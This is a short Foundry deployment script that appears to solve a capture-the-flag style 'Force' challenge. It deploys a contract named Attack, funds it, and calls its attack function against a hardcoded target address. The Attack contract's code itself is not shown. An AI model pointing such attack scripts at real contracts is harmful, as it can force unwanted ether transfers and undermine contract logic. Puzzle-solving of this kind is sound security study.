// filepath: script/DeployAttack.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/force.sol";
import "forge-std/console.sol";


contract Deploy is Script {
    function run() external {
        vm.startBroadcast();
        Attack attackcontract=new Attack();
        (bool success,bytes memory data) = address(attackcontract).call{value: 0.01 ether}("");
        console.log("Attack contract deployed at:", address(attackcontract));
        require(success, "Call failed");
        console.logBytes(data);
        vm.stopBroadcast();
    }
}

contract CallFunction is Script {
    function run() external {
        vm.startBroadcast();
        Attack attackcontract = Attack(payable(address(0xd3a6a2319b52C304B00A69398Abe7B3da80ba50F))); // Replace with actual deployed address
        attackcontract.attack{value: 1 wei}(payable(address(0xe360362d1A7c9bba98fF2Cab291D3f6068d34cda)));
        vm.stopBroadcast();
    }
}